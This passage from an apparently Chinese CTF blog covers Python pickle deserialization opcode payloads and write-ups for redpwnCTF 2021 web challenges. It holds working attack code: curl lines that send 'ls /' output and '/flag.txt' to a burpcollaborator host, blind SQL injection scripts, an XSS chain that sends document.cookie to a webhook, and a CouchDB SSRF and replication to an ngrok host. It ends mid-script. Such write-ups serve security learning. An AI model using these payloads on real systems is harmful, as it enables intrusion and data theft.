b\u0026#39;\u0026#39;\u0026#39;i__main__\\nread\\n.\u0026#39;\u0026#39;\u0026#39; payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit(\u0026#34;flag\u0026#34;) print(\u0026#34;Payload:\u0026#34;, payload) # b\u0026#39;(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\n.\u0026#39; print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) if __name__ == \u0026#34;__main__\u0026#34;: main() 再把这一部分的payload缝合到创建Animal实例的Opcode中去\n# 原: name=\u0026#39;x\u0026#39;,category=\u0026#39;y\u0026#39; b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; # 缝合 应该能看出来改在哪里了 b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\nq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; 一些小技巧\u0026amp;注意事项 当把payload作为get参数请求时，url编码注意换行符是%0A而不是%0D%0A 对payload进行b64加密时，注意别把\\n给单独编码了（不过正常都不会） 其他模块的load也可以触发pickle反序列化漏洞 例如：numpy.load()先尝试以numpy自己的数据格式导入，如果失败，则尝试以pickle的格式导入；pandas.read_pickle()直接使用pickle.load()方法\n灵活运用burp collaborator 虽然我们不能把burp提供的collaborator当作vps来使用，进行反弹shell然后一通操作，但是我们可以利用反引号+curl的方式直接获得代码执行和结果的输出；curl本身的用法也很多，可以直接带文件进行post，更多内容参见：curl 的用法指南\n# 基操1 os.system(\u0026#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`) # 基操2 -d参数可以读取本地文件内容作为数据体发送，会自动添加请求头并调整请求方法 无需-X POST os.system(\u0026#39;curl -d \u0026#39;@/flag.txt\u0026#39; http://xxxx.burpcollaborator.net/) 最后，出于安全角度的考量 禁用pickle，使用Json或Google Protocol Buffers\n当确实需要使用pickle时，要确保对用户的输入进行过滤，比如重写find_class()（使用白名单而不是黑名单进行过滤）、禁止某些操作符；由于在对opcode进行反序列化时可能会造成任意文件读写，一定提前对重要文件做好权限的管理；必要时可以对信息进行hmac签名\n举一个hmac的栗子\nimport hmac import pickle import base64 class Student: def __init__(self, name, age): self.name = name self.age = age def __str__(self): return \u0026#34;My name is %s, I am %d years old.\u0026#34; % ( self.name, self.age ) class HMAC_Pickler: def __init__(self, secret_key, seperator=\u0026#34;|\u0026#34;): self.secret_key = secret_key self.seperator = seperator def digital_signature(self, data): signer = hmac.new(self.secret_key) signer.update(data) return signer.hexdigest() def loads(self, data): sign = data[:32] p = data[32+len(self.seperator):] assert sign == self.digital_signature(p), (\u0026#34;Data is tampered by someone.\u0026#34;) return pickle.loads(p) def dumps(self, obj): p = pickle.dumps(obj) sign = self.digital_signature(p) return \u0026#34;%s%s%s\u0026#34; % (sign, self.seperator, p) def main(): SECRET_KEY = b\u0026#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f\u0026#39; pickler = HMAC_Pickler(SECRET_KEY) obj = Student(\u0026#34;Jack\u0026#34;, 19) print(obj) p = pickler.dumps(obj) print(p) o = pickler.loads(p) print(o) p += \u0026#34;I am hacker, trying evil things\u0026#34; x = pickler.loads(p) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main() 栗子9 - [BalsnCTF 2019] Pyshv3 这次的find_class()没有变化，但是structs有具体的实现\n同时server.py的逻辑也发生了变化，不用rce了，直接有一个拿flag的函数，但需要self.user.privileged为True才可以返回\n而这个self.user.privileged在一开始就被设为了False\nemmmm 这怎么绕过捏？\n先说非预期，将__builtins__复制到modules属性上；再说说预期解。\n我们知道，有__get__，__set__这样描述器协议方法的对象称为描述器descriptor。默认对属性的访问控制都是从对象的字典__dict__里面进行获取(get)，设置(set)和删除(delete)的方法（前面的那道题也用到这个点）。举例来说，a.x的查找顺序是a.__dict__['x']，之后type(a).__dict__['x']，然后找type(a)的父类。如果查找到的值是一个描述器，python就会调用描述器的方法来重写默认的控制行为，这个重写发生在这个查找环节的哪里取决于定义了哪个描述器方法。（注意：只有在新式类中时描述器才起作用）（更多介绍参见：什么是描述符（descriptor））\n我们利用描述器的特性，将User类的__set__方法重载为structs.User，并把它的privileged属性赋值为一个User实例。当进行self.user.privileged被赋值时触发__set__，但由于已经被重写，所以并不会被赋值False，而是保持原样，还是一个User实例。在后面if判断时，User实例当然是True，就可以绕过了。\npker\nUser = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) User.__set__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) user = User(0, 0) User.privileged = user return user opcode\nb\u0026#34;cstructs\\nUser\\np0\\n0g0\\n(}(S\u0026#39;__set__\u0026#39;\\ncstructs\\nUser\\ndtbg0\\n(I0\\nI0\\ntRp2\\n0g0\\n(}(S\u0026#39;privileged\u0026#39;\\ng2\\ndtbg2\\n.\u0026#34; 考虑到这个题更综合了python的相关特性，所以把这个题放在最后。\n从新建文件到写完用了几天时间，细细地整理相关知识，也算是对反序列化这个知识点的认识清晰了不少。还有一个PyYAML的反序列化问题，由于篇幅问题拆开来放到下一篇中。自认为总结的还是比较详细的（嘿嘿x）不过肯定还有不周到的地方，之后如遇到更多知识还会进行补充。\n自己还是有惰性啊，其实反序列化第一篇总结的是php，可是到现在还有几个二级标题下面是空白的……只能先给自己找个借口：php反序列化的东西实在是太多了TAT\n最后放一下全篇用到的的参考文章（部分已写在对应标题下面），不分先后~\nPython 反序列化漏洞学习笔记 | 一篇文章带你理解漏洞之 Python 反序列化漏洞 | pickle反序列化初探 | Python pickle 反序列化实例分析 | Python 反序列化安全问题（一） - Python 反序列化安全问题（二） | 从零开始python反序列化攻击：pickle原理解析 \u0026amp; 不用reduce的RCE姿势 | 关于Python sec的一些简单的总结 | Sour Pickles A serialised exploitation guide in one part - Macro Slaviero | 🐍 Security Issues in Python Pickle\n","date":"2021-08-12T11:48:05+08:00","permalink":"https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/","section":"posts","tags":["python","unserialize"],"title":"反序列化专题笔记·壹·python篇"},{"categories":["CTF"],"contents":"官方的docker地址~~复现一本满足~https://github.com/redpwn/redpwnctf-2021-challenges\nweb/inspect-me See if you can find the flag in the source code!\ninspect-me.mc.ax\nweb/orm-bad I just learned about orms today! They seem kinda difficult to implement though\u0026hellip; Guess I\u0026rsquo;ll stick to good old raw sql statements!\norm-bad.mc.ax\nDownloads - app.js\n万能密码：admin\u0026rsquo;or'1 : admin\n关于orm 之后要补一下知识：Object–relational mapping ORM 实例教程\nweb/secure Just learned about encryption—now, my website is unhackable!\nsecure.mc.ax\nDownloads - index.js\n还是个登录框，尝试万能密码\n源码是这样的\nconst crypto = require(\u0026#39;crypto\u0026#39;); const express = require(\u0026#39;express\u0026#39;); const db = require(\u0026#39;better-sqlite3\u0026#39;)(\u0026#39;db.sqlite3\u0026#39;); db.exec(`DROP TABLE IF EXISTS users;`); db.exec(`CREATE TABLE users( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT );`); db.exec(`INSERT INTO users (username, password) VALUES ( \u0026#39;${btoa(\u0026#39;admin\u0026#39;)}\u0026#39;, \u0026#39;${btoa(crypto.randomUUID)}\u0026#39; )`); const app = express(); app.use( require(\u0026#39;body-parser\u0026#39;).urlencoded({ extended: false, }) ); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (!req.body.username || !req.body.password) return res.redirect(\u0026#39;/?message=Username and password required!\u0026#39;); const query = `SELECT id FROM users WHERE username = \u0026#39;${req.body.username}\u0026#39; AND password = \u0026#39;${req.body.password}\u0026#39;;`; try { const id = db.prepare(query).get()?.id; if (id) return res.redirect(`/?message=${process.env.FLAG}`); else throw new Error(\u0026#39;Incorrect login\u0026#39;); } catch { return res.redirect( `/?message=Incorrect username or password. Query: ${query}` ); } }); 他这个b64加密是发生在前端的，也就是在发包的时候就已经对post的数据进行了预处理，而具体到后端进行sql语句的查询时会直接拼接req.body.username/passwd的数据，不会进行进一步的检查或过滤\n刚开始想复杂了\nweb/cool Aaron has a message for the cool kids. For support, DM BrownieInMotion.\ncool.mc.ax\nDownloads - app.py\n登录框，可以注册 先尝试test: test 登录成功但是无法获取信息（注册后也会跳转这个页面\n留意cookie部分，是熟悉的flask session，扔进工具里解密\n再参考源码中的/message部分，考虑将session设为{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;ginkoid\u0026rdquo;}后登入查看信息（开始以为是session伪造 后来发现不是）\n看一下其他部分的源码，首先是init()\ndef init(): # this is terrible but who cares execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) execute(\u0026#39;DROP TABLE users;\u0026#39;) execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) # put ginkoid into db ginkoid_password = generate_token() execute( \u0026#39;INSERT OR IGNORE INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;ginkoid\\\u0026#39;, \\\u0026#39;{ginkoid_password}\\\u0026#39;);\u0026#39; ) execute( f\u0026#39;UPDATE users SET password=\\\u0026#39;{ginkoid_password}\\\u0026#39;\u0026#39; f\u0026#39;WHERE username=\\\u0026#39;ginkoid\\\u0026#39;;\u0026#39; ) 然后是在创建用户create_user()和登录check_login()时都会检测用户名中是否有非法字符（白名单是26个英文字母大小写和数字），算是挺严格的\ndef create_user(username, password): if any(c not in allowed_characters for c in username): return (False, \u0026#39;Alphanumeric usernames only, please.\u0026#39;) if len(username) \u0026lt; 1: return (False, \u0026#39;Username is too short.\u0026#39;) if len(password) \u0026gt; 50: return (False, \u0026#39;Password is too long.\u0026#39;) other_users = execute( f\u0026#39;SELECT * FROM users WHERE username=\\\u0026#39;{username}\\\u0026#39;;\u0026#39; ) if len(other_users) \u0026gt; 0: return (False, \u0026#39;Username taken.\u0026#39;) execute( \u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39; # passwd部分可控 ) return (True, \u0026#39;\u0026#39;) 考虑了一下二次注入，因为注册时的passwd部分完全可控，设想是这样的\n构造passwd部分为 '),('ginkoid','passwd\nemmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时correct_password[0][0]==password，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是[0][0]，而新插入的passwd将是[1][0]；并且在init()时定义username是primary 也不可能有重复的\n————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现\n在看了这篇wp之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是\n\u0026#39;),(\u0026#39;ginkoid\u0026#39;,\u0026#39;\u0026#39;) ON CONFLICT DO UPDATE SET password=\u0026#39;\u0026#39;;-- 其中的ON CONFLICT DO UPDATE SET，在这篇官方文档里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won\u0026rsquo;t do.\n最后使用盲注的方式，先上一下脚本 （这里是来源）再说说思路\nimport time import requests url = \u0026#34;https://cool.mc.ax/\u0026#34; # url = \u0026#34;http://127.0.0.1:5000/\u0026#34; prefix = \u0026#34;asdfjwfoijweoijfojiewfj\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#34; val = \u0026#34;\u0026#34; for i in range(32): username = prefix + str(time.time_ns()).replace(\u0026#34;0\u0026#34;, \u0026#34;\u0026#34;)\t# 注意白名单里没有0 要换掉 password = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; resp = requests.post(url + \u0026#34;register\u0026#34;, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password}).text for c in charset: resp = requests.post(url, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: c}).text if \u0026#34;Incorrect\u0026#34; not in resp: print(c) val += c break print(val) 注入点仍然是上文提到的/register路由中create_user(username,password)（当时找对了注入点，但是盲注这块还是做的少）\n主要的payload是\npassword = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; 这一句，当进入到注册流程时 会执行\nexcute(\u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39;) 即\nexcute(\u0026#39;INSERT INTO users(username, password)\u0026#39; values (\u0026#39;xxxxusernamexxxx\u0026#39;, \u0026#39;\u0026#39;||(select substr(password,n,1) from users)||\u0026#39;\u0026#39;)) 其中||连接两个不同的字符串，得到一个新的字符串；所以发送注册请求时password的值就是后面的查询语句select substr(password,n,1) from users，而查询语句返回的是substr(password,n,1) 是ginkoid这个账户的密码的其中一位，要获得这个值具体是什么 需要再有一个for in _ in charset遍历，在登录处 把这个值给试出来\n英文版讲解：The SELECT statement will take the character at index in ginkoid\u0026rsquo;s password, and concatenate it with \u0026lsquo;\u0026rsquo;, to be used as the new user\u0026rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.\n获得密码后以ginkoid的账号登录，会得到一个mp3文件，但是并不是什么所谓的隐写 flag就在抓包后可以看到\n————其实还是有一点点疑问，为什么select substr(password,n,1) from users就能确保是ginoid的passwd呢？ginkoid是表中的第一条数据，在新建表后立刻插入，这就可以保证在查询的时候只查ginkoid的密码吗？\ndiscord之前有人问过这个问题，当时的解答是这是sqllite的特性，但是用sqllite在线工具尝试后发现也不是这样的 也会返回所有数据的substr(x,x,x)的值，但是确实是用这样的payload能做出来\n————后来想了一下 是这里的return correct_password[0][0]==password 确保了虽然sql查询语句返回的是很多个单一字母，但是是多行返回，仍然只会取到第一个；再加上username是主键 第一个插入，所以这个payload是可以的\n以一个事后诸葛亮的角度来看return correct_password[0][0]==password 这句代码 其实有暗示的成分在了\n————还有另一版的脚本 discord里收的\nimport asyncio import random import aiohttp allowed = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#39; url = \u0026#39;\u0026lt;https://cool.mc.ax/\u0026gt;\u0026#39; n = 32 final = dict() async def try_pass(sem, username, password, index): params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password, } async with sem: async with aiohttp.ClientSession() as session: async with session.post(url, data=params) as resp: result = await resp.text() if \u0026#39;Incorrect\u0026#39; not in result: print(f\u0026#39;password[{index}]: {password}\u0026#39;) final[index] = password async def get_char(sem, index): # random username since otherwise we error username = \u0026#39;\u0026#39;.join(random.choices(allowed, k=32)) payload = f\u0026#34;\u0026#39;||(SELECT substr(password,{index+1},1) FROM users)||\u0026#39;\u0026#34; assert(len(payload) \u0026lt;= 50) params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: payload, } async with sem: async with aiohttp.ClientSession() as session: await session.post(url + \u0026#39;register\u0026#39;, data=params) tasks = [] for c in allowed: tasks.append(try_pass(sem, username, c, index)) await asyncio.gather(*tasks) async def main(): # without this we get an OSError due to too many open file descriptors sem = asyncio.Semaphore(300) index_tasks = [] for i in range(n): index_tasks.append(get_char(sem, i)) await asyncio.gather(*index_tasks) password = \u0026#39;\u0026#39; for i in range(len(final)): password += final[i] print(f\u0026#34;Password: {password}\u0026#34;) asyncio.run(main()) web/notes Texting things to yourself, but online! notes.mc.ax\nPlease put a reasonably secure password when making an account\nReport problems here.\nDownloads - notes.tar.gz\n先看页面 是个登录框，先填用户名和密码再点login或register，尝试test: test登入，界面是一个可以加notes 自定body和tag的app\n在view notes看到已经有人试过xss了，这里有个小小的越权漏洞，/view/+username直接可以看到其他的师傅在尝试什么样的payload（看了wp以后才意识到这里的tag部分就是注入点 而当时的我以为是卡bug了\n简单审了下源码，也没啥特别的，首先初始化一个admin号，flag在admin的private分类的notes中；对于个人发的notes会转义body部分为html实体来预防xss\n但是这个notes-app的形式是妥妥的xss了，那突破口在哪里捏？其实是被忽略的tag部分！一般情况下看到tag可选private/public就会不关注这里，但是配合特殊的DOM解析 这里无疑是注入点！下面简单分析一下，参考wp\n从/static/view.html中我们可以看到这个notes-app的前端渲染所凭借的模板长啥样\nbody部分被完全的保护了，但是tag没有过滤 只是限制了个数\n我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用\u0026lt;p\u0026gt; 另一个里面放\u0026lt;/p\u0026gt;，中间的部分会被放在一起）这里选用的是\u0026lt;style\u0026gt;这个tag，利用它onload的属性\n还有一个待解决的问题是上下两个notes之间会有\u0026lt;div class=\u0026quot;card\u0026quot;\u0026gt;的存在；这也是不用\u0026lt;iframe\u0026gt;和它的onload属性的原因，因为浏览器是不允许\u0026lt;iframe\u0026gt;中属性换行的\n我们最终的payload\nbody: anything tag: \u0026lt;style a=\u0026#39; body: anything tag: \u0026#39;onload=\u0026#39;` body: `;eval(somecode)/* tag: */\u0026#39;\u0026gt; 然后是常规的xss\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.open(\u0026#34;https://notes.mc.ax/view/\u0026lt;username\u0026gt;\u0026#34;, \u0026#34;navigator.sendBeacon(\u0026#39;\u0026lt;webhook server\u0026gt;\u0026#39;, document.cookie)\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; web/Requester Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021\nrequester.mc.ax\nDownloads - requester-release.zip\njava可以说是完全不懂，比赛的时候就简单看了下就溜了，参考 解法1 - _replicator 解法2 - _find\n一个简单的java-app，检测给出的api是否正常 并且返回一个json\n给了docker\n先用jd-gui打开jar包看看源码\n先看Main.class\npublic class Main { public static Database db; public static String flag; public static void main(String[] args) { String adminUser = System.getenv(\u0026#34;adminUser\u0026#34;); String adminPassword = System.getenv(\u0026#34;adminPassword\u0026#34;); flag = System.getenv(\u0026#34;flag\u0026#34;); String javalinEnv = System.getenv(\u0026#34;javalinEnv\u0026#34;); db = new Database(adminUser, adminPassword); db.initializeDatabase(); JavalinJte.configure(createTemplateEngine(javalinEnv)); Javalin app = Javalin.create().start(8080); app.get(\u0026#34;/\u0026#34;, ctx -\u0026gt; ctx.render(\u0026#34;index.jte\u0026#34;)); app.get(\u0026#34;/createUser\u0026#34;, Handlers::createUser); app.get(\u0026#34;/testAPI\u0026#34;, Handlers::testAPI); } } 做一些初始化的工作，取出admin的用户名和密码以及flag的值，新建一个database，分出3个路由；\n先看database.class（分析的比较详细 之前做java很少\nprivate final String adminUsername; private final String adminPassword; public Database(String adminUsername, String adminPassword) { this.adminUsername = adminUsername; this.adminPassword = adminPassword; } private String getDbString() { return \u0026#34;http://\u0026#34; + this.adminUsername + \u0026#34;:\u0026#34; + this.adminPassword + \u0026#34;@couchdb:5984/\u0026#34;; } private boolean validateAlphanumeric(String name) { return name.matches(\u0026#34;^[a-zA-Z0-9_]*$\u0026#34;); } 存储从main.class里接收到的adminUsername\u0026amp;adminPassword；getDbString()返回一个可以用来连接couchdb数据库的url\npublic void createDatabase(String name) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); JSONObject res = HttpClient.putAPI(getDbString() + getDbString(), \u0026#34;\u0026#34;); if (!res.has(\u0026#34;ok\u0026#34;) || !res.getBoolean(\u0026#34;ok\u0026#34;)) throw new Exception(\u0026#34;Database creation failed\u0026#34;); } public void initializeDatabase() { try { createDatabase(\u0026#34;_replicator\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Replicator already initialized\u0026#34;); } try { createDatabase(\u0026#34;_users\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Users already initialized\u0026#34;); } try { createDatabase(\u0026#34;log\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Log already initialized\u0026#34;); } } 通过向构造好的url发送http请求来创建数据库，有三个默认的库：_replicator, _users, log\npublic void createUser(String name, String password) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); if (password.length() \u0026gt; 16 || !validateAlphanumeric(password)) throw new Exception(\u0026#34;Illegal password\u0026#34;); // ... boring java stuff JSONObject res = HttpClient.putAPI(getDbString() + \u0026#34;_users/org.couchdb.user:\u0026#34; + getDbString(), userObj.toString()); // ... boring java stuff } public void addUserToDatabase(String dbName, String username) throws Exception { if (dbName.length() \u0026gt; 16 || !validateAlphanumeric(dbName)) throw new Exception(\u0026#34;Illegal dbname\u0026#34;); if (username.length() \u0026gt; 16 || !validateAlphanumeric(username)) throw new Exception(\u0026#34;Illegal username\u0026#34;); // ... boring java stuff JSONObject res = HttpClient.putAPI(getDbString() + getDbString() + \u0026#34;/_security\u0026#34;, configObj.toString()); // ... boring java stuff } public void insertDocumentToDatabase(String dbName, String document) throws Exception { // ... boring java stuff JSONObject res = HttpClient.postAPI(getDbString() + getDbString(), document); // ... boring java stuff } 这部分是创建用户并插入数据库中 并且插入一个文件，欸 用的也是http发请求这一招 这不就可控了？\n这里就完了，转去看Handlers.class\npublic static void createUser(Context ctx) { String username = (String)ctx.queryParam(\u0026#34;username\u0026#34;, String.class).get(); String password = (String)ctx.queryParam(\u0026#34;password\u0026#34;, String.class).get(); try { Main.db.createDatabase(username); Main.db.createUser(username, password); Main.db.addUserToDatabase(username, username); JSONObject flagDoc = new JSONObject(); flagDoc.put(\u0026#34;flag\u0026#34;, Main.flag); Main.db.insertDocumentToDatabase(username, flagDoc.toString()); ctx.result(\u0026#34;success\u0026#34;); } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } } 当发出一个请求 带着username和passwd时，它会调用createUser()创建一条用户的数据存入库中，并且存一个flagDoc；接着看最后一个testAPI\npublic static void testAPI(Context ctx) { String url = (String)ctx.queryParam(\u0026#34;url\u0026#34;, String.class).get(); String method = (String)ctx.queryParam(\u0026#34;method\u0026#34;, String.class).get(); String data = ctx.queryParam(\u0026#34;data\u0026#34;); try { URL urlURI = new URL(url); if (urlURI.getHost().contains(\u0026#34;couchdb\u0026#34;)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } catch (MalformedURLException e) { throw new BadRequestResponse(\u0026#34;Input URL is malformed\u0026#34;); } try { if (method.equals(\u0026#34;GET\u0026#34;)) { JSONObject jsonObj = HttpClient.getAPI(url); String str = jsonObj.toString(); } else if (method.equals(\u0026#34;POST\u0026#34;)) { JSONObject jsonObj = HttpClient.postAPI(url, data); String stringJsonObj = jsonObj.toString(); if (Utils.containsFlag(stringJsonObj)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } else { throw new BadRequestResponse(\u0026#34;Request method is not accepted\u0026#34;); } } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } ctx.result(\u0026#34;success\u0026#34;); } 对给出的url（通过url参数进行提交）进行get或者post，先检查if (urlURI.getHost().contains(\u0026quot;couchdb\u0026quot;))，如果为真直接报错；之后发出请求 如果Utils.containsFlag(stringJsonObj)为真也会报错出去\n源码算是看完了，接下来想想解题的方法（有部分关于ssrf的前置知识可以看这篇鼻祖ppt - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai）\n本地先起一个环境，run on localhost:8080，\n$ curl localhost:8080/testAPI?url=https://couchdb:5984/\\\u0026amp;method=GET Illegal! 由之前的代码分析我们知道因为couchdb的存在所以illegal，但是不太重要（反正终会被绕过）先创建一个用户\n$ curl http://localhost:8080/createUser?username=neptunian\\\u0026amp;password=neptunian # Creating user success $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq # Listing \u0026#34;neptunian\u0026#34; database documents, using our credentials (jq formats our JSON output) { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } } ] } $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b | jq # Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{fake}\u0026#34; } 显然当我们新建一个用户时，我们的fake flag会被自动插入这个数据库中，并且直接curl是可以取出来的，但是题目是不能直接curl 需要缝合到限定的testAPI上，尝试构造一下~\n$ curl -vv http://localhost:8080/testAPI?method=GET\\\u0026amp;url=http://neptunian:neptunian\\@couchdb\\:5984\\@couchdb\\:5984/neptunian ... success 这样构造的url并不会触发filter，但是由于仅仅返回success而没有更多的信息，为了验证是不是触及到了couchdb server，我们可以尝试插入一个自定义的doc，这里用py脚本传\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # Simple POST Test params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; }) ) ) # Local response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 2, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } }, { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34; } } ] } # There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09! $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 | jq { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34;, \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; } 足以证明我们自己构造的带testAPI的缝合怪是可以正常执行couchdb相关的增删查改功能的\n而重要的是远程也能打通，这里有这么个好东西https://docs.couchdb.org/en/3.1.1/replication/replicator.html，我们只需要构造一组post数据就可以远程得到一份数据！\n{ \u0026#34;source\u0026#34;: \u0026#34;source_db_name\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;http://dest_user:dest_password@destination_host/dest_database\u0026#34; } 至于做法就很简单了：先用ngrok搞一个网上可访问的couchdb，得到临时的url https://2d0a4710580a.ngrok.io，先创建数据库来便于接收之后复制的数据\n$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag {\u0026#34;ok\u0026#34;:true} 然后就可以利用replicator和精心构造的json数据大搞特搞了！先本地\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # POST Replication params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;source\u0026#34;: \u0026#34;neptunian\u0026#34;, \u0026#34;target\u0026#34;: 